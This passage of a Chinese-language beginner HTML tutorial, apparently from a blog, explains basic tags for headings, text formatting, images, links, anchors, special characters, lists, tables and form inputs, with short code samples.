class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>是不是看上去框架很复杂？yes/no ? 哈哈哈，这里就体现出HBuilderX的好处了，前面提到了，可以代码补全，当</p><p>然也可以直接把框架生成出来；</p><h2 id="简单编写"><a href="#简单编写" class="headerlink" title="简单编写"></a>简单编写</h2><p>先介绍一些最简单的用法吧；</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>...<span class="tag">&lt;/<span class="name">title</span>&gt;</span>   <span class="comment">&lt;!-- 网页标题 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>...<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>   <span class="comment">&lt;!-- 1级标题 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>...<span class="tag">&lt;/<span class="name">h2</span>&gt;</span>   <span class="comment">&lt;!-- 2级标题 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>...<span class="tag">&lt;/<span class="name">h3</span>&gt;</span>   <span class="comment">&lt;!-- 3级标题 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h4</span>&gt;</span>...<span class="tag">&lt;/<span class="name">h4</span>&gt;</span>   <span class="comment">&lt;!-- 4级标题 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h5</span>&gt;</span>...<span class="tag">&lt;/<span class="name">h5</span>&gt;</span>   <span class="comment">&lt;!-- 5级标题 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h6</span>&gt;</span>...<span class="tag">&lt;/<span class="name">h6</span>&gt;</span>   <span class="comment">&lt;!-- 6级标题 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>...<span class="tag">&lt;/<span class="name">p</span>&gt;</span>              <span class="comment">&lt;!-- 段落标签，文字会独占一行 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">i</span>&gt;</span>...<span class="tag">&lt;/<span class="name">i</span>&gt;</span>            <span class="comment">&lt;!-- 定义斜体字--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span>...<span class="tag">&lt;/<span class="name">b</span>&gt;</span>          <span class="comment">&lt;!-- 定义粗体字 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">big</span>&gt;</span>...<span class="tag">&lt;/<span class="name">big</span>&gt;</span>      <span class="comment">&lt;!-- 定义大号字 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">small</span>&gt;</span>...<span class="tag">&lt;/<span class="name">small</span>&gt;</span>    <span class="comment">&lt;!-- 定义小号字 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">strong</span>&gt;</span>...<span class="tag">&lt;/<span class="name">strong</span>&gt;</span>  <span class="comment">&lt;!-- 定义加重字 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">em</span>&gt;</span>...<span class="tag">&lt;/<span class="name">em</span>&gt;</span>         <span class="comment">&lt;!-- 定义着重字 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">sub</span>&gt;</span>...<span class="tag">&lt;/<span class="name">sub</span>&gt;</span>          <span class="comment">&lt;!-- 定义下标字 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">sup</span>&gt;</span>...<span class="tag">&lt;/<span class="name">sup</span>&gt;</span>          <span class="comment">&lt;!-- 定义上标字 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ins</span>&gt;</span>...<span class="tag">&lt;/<span class="name">ins</span>&gt;</span>          <span class="comment">&lt;!-- 定义下划线 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">del</span>&gt;</span>...<span class="tag">&lt;/<span class="name">del</span>&gt;</span>          <span class="comment">&lt;!-- 定义删除字 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span>      <span class="comment">&lt;!-- 换行 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span> /&gt;</span>      <span class="comment">&lt;!-- 水平线 --&gt;</span></span><br><span class="line"><span class="symbol">&amp;nbsp;</span>      <span class="comment">&lt;!-- 网页上显示一个空格 --&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>看上去有点晕，那就来演示一遍</p><p>这是代码：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>2020.3.14<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>*测试标题效果*<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello HTML!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>Hello HTML!<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>Hello HTML!<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h4</span>&gt;</span>Hello HTML!<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h5</span>&gt;</span>Hello HTML!<span class="tag">&lt;/<span class="name">h5</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h6</span>&gt;</span>Hello HTML!<span class="tag">&lt;/<span class="name">h6</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>*测试字体效果*<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Hello<span class="symbol">&amp;nbsp;</span>HTML!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">i</span>&gt;</span>Hello HTML!<span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span>Hello HTML!<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">big</span>&gt;</span>Hello HTML!<span class="tag">&lt;/<span class="name">big</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">em</span>&gt;</span>Hello HTML!<span class="tag">&lt;/<span class="name">em</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">small</span>&gt;</span>Hello HTML!<span class="tag">&lt;/<span class="name">small</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">strong</span>&gt;</span>Hello HTML!<span class="tag">&lt;/<span class="name">strong</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">Hello<span class="tag">&lt;<span class="name">sub</span>&gt;</span> HTML!<span class="tag">&lt;/<span class="name">sub</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">Hello<span class="tag">&lt;<span class="name">sup</span>&gt;</span> HTML!<span class="tag">&lt;/<span class="name">sup</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ins</span>&gt;</span>Hello HTML!<span class="tag">&lt;/<span class="name">ins</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">del</span>&gt;</span>Hello HTML!<span class="tag">&lt;/<span class="name">del</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>看运行结果：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/html_1.jpg" alt="Test"></p><p>怎么样，是不是很有趣，nice！</p><h2 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h2><p>基本操作就那么些些，现在看一些稍微高级一些的：</p><h3 id="插入图片"><a href="#插入图片" class="headerlink" title="插入图片"></a>插入图片</h3><p>实现代码：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"..."</span> <span class="attr">alt</span>=<span class="string">"..."</span> <span class="attr">title</span>=<span class="string">"..."</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><blockquote><p>格式是这样，<strong>src</strong>里面写的是图片地址，这里你可以写绝对路径，也可以写相对路径（本使用本地图片时，要在HTML文件夹里新建一个文件夹，我使用的叫做<strong>img</strong>文件夹，把图片放进去）；<strong>alt</strong>里面写的是，当你的图片显示不出来（比如链接有问题…）显示的文字；<strong>title</strong>里面写的是，鼠标放在图片上显示的文字。</p></blockquote><p> <strong>● 我用的本地引用，写法如下：</strong></p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"../img/1.jpg"</span> <span class="attr">alt</span>=<span class="string">"Picture"</span> <span class="attr">title</span>=<span class="string">"This is a picture"</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p> <strong>● 如果用网上的图片地址，如下：</strong></p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://..."</span> <span class="attr">alt</span>=<span class="string">"Picture"</span> <span class="attr">title</span>=<span class="string">"This is a picture"</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>这是基本写法，也可以增加一些CSS，比如增加图片的大小：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"..."</span> <span class="attr">alt</span>=<span class="string">"..."</span> <span class="attr">title</span>=<span class="string">"..."</span> <span class="attr">width</span>=<span class="string">"..."</span> <span class="attr">height</span>=<span class="string">"..."</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><h3 id="引入文件的地址路径"><a href="#引入文件的地址路径" class="headerlink" title="引入文件的地址路径"></a>引入文件的地址路径</h3><h4 id="相对路径"><a href="#相对路径" class="headerlink" title="相对路径"></a>相对路径</h4><p><strong><em>.  在路径中表示当前路径</em></strong></p><p><strong><em>.. 在路径中表示上一级路径</em></strong></p><p>通俗来讲  就是  该文件和新建的<strong><em>.html</em></strong>文件是否在同一级路径</p><h4 id="绝对路径"><a href="#绝对路径" class="headerlink" title="绝对路径"></a>绝对路径</h4><p>绝对路径就基本不受控制了，它不会看你的本地文件，只会去找你引进文件的这个地址.</p><h3 id="跳转链接"><a href="#跳转链接" class="headerlink" title="跳转链接"></a>跳转链接</h3><p>这种是最简单的形式：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.baidu.com"</span>&gt;</span>百度<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>加点样式：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.baidu.com"</span> <span class="attr">target</span>=<span class="string">"_blank"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"../img/1.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><blockquote><p>这样引用一张图片，就会生成一张可以跳转链接的图片；target=”_blank”这个是当点击图片时，就会新建一个窗口打开链接（target有很多样式）</p></blockquote><p>如果在html文件中需要很多的新建窗口这种样式，每一个都写target不太方便，这里可以在<strong>*&lt; head &gt;&lt; /head &gt;*</strong>里面添加如下一句话：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">base</span> <span class="attr">target</span>=<span class="string">"_blank"</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><h3 id="跳转锚点"><a href="#跳转锚点" class="headerlink" title="跳转锚点"></a>跳转锚点</h3><p>跳转锚点就是在网页点击一个链接，会跳转到该网页的对应位置；</p><h4 id="实现方法1"><a href="#实现方法1" class="headerlink" title="实现方法1"></a>实现方法1</h4><p><strong><em>●  符号 —&gt; #</em></strong> </p><p><strong><em>●  id 属性</em></strong></p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#..."</span>&gt;</span>...<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">"..."</span>&gt;</span>...<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><blockquote><p><strong><em>#</em></strong> 后面的内容与 <strong><em>id</em></strong> 里面的保持一致</p></blockquote><h4 id="实现方法2"><a href="#实现方法2" class="headerlink" title="实现方法2"></a>实现方法2</h4><p><strong><em>●  符号 —&gt; #</em></strong> </p><p><strong><em>●  name 属性（name属性加给的是a标签）</em></strong></p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#..."</span>&gt;</span>...<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">name</span>=<span class="string">"..."</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>...<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><blockquote><p><strong><em>#</em></strong> 后面的内容与 <strong><em>name</em></strong> 里面的保持一致</p><p>点击链接时会跳转到<strong><em>“name”</em></strong>的下一行</p></blockquote><h3 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号"></a>特殊符号</h3><table><thead><tr><th align="center"><strong>特殊字符</strong></th><th align="center"><strong>含义</strong></th><th align="center"><strong>代码</strong></th></tr></thead><tbody><tr><td align="center"><strong>&nbsp;</strong></td><td align="center"><strong>空格符</strong></td><td align="center"><strong>&amp; nbsp；</strong></td></tr><tr><td align="center"><strong>©</strong></td><td align="center"><strong>版权</strong></td><td align="center"><strong>&amp; copy；</strong></td></tr><tr><td align="center"><strong>®</strong></td><td align="center"><strong>注册商标</strong></td><td align="center"><strong>&amp; reg；</strong></td></tr><tr><td align="center"><strong>&gt;</strong></td><td align="center"><strong>大于号</strong></td><td align="center"><strong>&amp; gt；</strong></td></tr><tr><td align="center"><strong>&lt;</strong></td><td align="center"><strong>小于号</strong></td><td align="center"><strong>&amp; lt；</strong></td></tr><tr><td align="center"><strong>&amp;</strong></td><td align="center"><strong>和号</strong></td><td align="center"><strong>&amp; amp；</strong></td></tr><tr><td align="center"><strong>¥</strong></td><td align="center"><strong>人民币</strong></td><td align="center"><strong>&amp; yen；</strong></td></tr><tr><td align="center"><strong>°</strong></td><td align="center"><strong>摄氏度</strong></td><td align="center"><strong>&amp; deg；</strong></td></tr></tbody></table><blockquote><p>这里需要注意的是代码的<strong>&amp;</strong>和<strong>右边的字母</strong>中间没有空格（因为语法问题，这里不打空格就会变成符号了2333）</p></blockquote><h3 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h3><h4 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h4><p>实现代码：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>...<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>进一步升级：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">type</span>=<span class="string">"..."</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>...<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><blockquote><p>type里面写属性，如下所示：</p></blockquote><table><thead><tr><th align="center"><strong>值</strong></th><th align="center"><strong>样式</strong></th></tr></thead><tbody><tr><td align="center"><strong>disc</strong></td><td align="center"><strong>实心圆（默认）</strong></td></tr><tr><td align="center"><strong>circle</strong></td><td align="center"><strong>空心圆</strong></td></tr><tr><td align="center"><strong>aquare</strong></td><td align="center"><strong>实心方块</strong></td></tr></tbody></table><h4 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h4><p>实现代码：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>...<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>进一步升级：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ol</span> <span class="attr">type</span>=<span class="string">"..."</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>...<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>相同地，type里面写属性：</p><table><thead><tr><th align="center"><strong>值</strong></th><th align="center"><strong>样式</strong></th></tr></thead><tbody><tr><td align="center"><strong>1</strong></td><td align="center"><strong>1、2、3</strong></td></tr><tr><td align="center"><strong>i</strong></td><td align="center"><strong>i、ii、iii</strong></td></tr><tr><td align="center"><strong>I</strong></td><td align="center"><strong>I、II、III</strong></td></tr><tr><td align="center"><strong>a</strong></td><td align="center"><strong>a、b、c</strong></td></tr><tr><td align="center"><strong>A</strong></td><td align="center"><strong>A、B、C</strong></td></tr></tbody></table><h4 id="定义列表"><a href="#定义列表" class="headerlink" title="定义列表"></a>定义列表</h4><p>●  &lt; dl &gt; ：定义列表</p><p>●  &lt; dt &gt;：定义专业术语或名词</p><p>●  &lt; dd &gt;：对名词进行解释和描述</p><p>代码：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dl</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dt</span>&gt;</span>...<span class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dd</span>&gt;</span>...<span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dl</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><h4 id="嵌套列表"><a href="#嵌套列表" class="headerlink" title="嵌套列表"></a>嵌套列表</h4><p>先来总结下前面说的3中列表：</p><p><strong>1、无序列表 —&gt; ul  li  符合嵌套的规范</strong></p><p><strong>2、有序列表 —&gt; ol  li  一般用的比较少，可以用无序列表来实现</strong></p><p><strong>3、定义列表 —&gt; dl  dt  dd  列表项需要添加标题和对标题进行描述的内容</strong></p><blockquote><p>注 ：列表之间可以相互嵌套，形成多层级的列表。</p></blockquote><h3 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h3><h4 id="表格标签"><a href="#表格标签" class="headerlink" title="表格标签"></a>表格标签</h4><p>●  &lt; table &gt;：表格的最外层容器</p><p>●  &lt; tr &gt;：定义表格行</p><p>●  &lt; th &gt;：定义表头</p><p>●  &lt; td &gt;：定义表格单元</p><p>●  &lt; caption &gt;：定义表格标题</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">caption</span>&gt;</span>...<span class="tag">&lt;/<span class="name">caption</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">th</span>&gt;</span>...<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>...<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>▲语义化标签：</p><p>&lt; thead &gt;、&lt; tbody &gt;、&lt; tfoot &gt;</p><p>▲ 用法：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span><br><span class="line">  </span><br><span class="line"><span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">tfoot</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">tfoot</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><blockquote><p>注：tbody可以出现多次，但是thead、tfoot只能出现一次</p></blockquote><h4 id="表格属性"><a href="#表格属性" class="headerlink" title="表格属性"></a>表格属性</h4><table><thead><tr><th align="center"><strong>代码</strong></th><th align="center"><strong>属性</strong></th></tr></thead><tbody><tr><td align="center"><strong>border</strong></td><td align="center"><strong>表格边框</strong></td></tr><tr><td align="center"><strong>cellpadding</strong></td><td align="center"><strong>单元格内的空间</strong></td></tr><tr><td align="center"><strong>cellspacing</strong></td><td align="center"><strong>单元格之间的空间</strong></td></tr><tr><td align="center"><strong>rowspan</strong></td><td align="center"><strong>合并行</strong></td></tr><tr><td align="center"><strong>colspan</strong></td><td align="center"><strong>合并列</strong></td></tr><tr><td align="center"><strong>align</strong></td><td align="center"><strong>左右对齐方式</strong></td></tr><tr><td align="center"><strong>valign</strong></td><td align="center"><strong>上下对齐方式</strong></td></tr></tbody></table><blockquote><p>注：1、<strong>border、cellpadding、cellspacing</strong>一般写在<strong>table</strong>标签里面，后面加上数值</p><p>2、<strong>rowspan、colspan</strong>一般写在<strong>th</strong>标签里面，并且当<strong>th</strong>标签和<strong>td</strong>标签数量不相同时常用</p><p>3、<strong>align、valign</strong>一般写在<strong>tr</strong>标签里面（<strong>align</strong>属性有：<strong>left、right、center、bottom</strong>… ; <strong>valign</strong>属性有<strong>top、bottom、center</strong>……）</p></blockquote><h4 id="表单input标签"><a href="#表单input标签" class="headerlink" title="表单input标签"></a>表单input标签</h4><p>●  &lt; form &gt;：表单的最外层容器</p><p>●  &lt; input &gt;：标签用于搜集用户信息，根据不同的type属性值，展示不同的控件（输入框、密码框…）</p><table><thead><tr><th align="center"><strong>type属性</strong></th><th align="center"><strong>含义</strong></th></tr></thead><tbody><tr><td align="center"><strong>text</strong></td><td align="center"><strong>普通的文本输入框</strong></td></tr><tr><td align="center"><strong>password</strong></td><td align="center"><strong>密码输入框</strong></td></tr><tr><td align="center"><strong>checkbox</strong></td><td align="center"><strong>复选框</strong></td></tr><tr><td align="center"><strong>radio</strong></td><td align="center"><strong>单选框</strong></td></tr><tr><td align="center"><strong>file</strong></td><td align="center"><strong>上传文件</strong></td></tr><tr><td align="center"><strong>submit</strong></td><td align="center"><strong>提交按钮</strong></td></tr><tr><td align="center"><strong>reset</strong></td><td align="center"><strong>重置按钮</strong></td></tr></tbody></table><p>代码：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 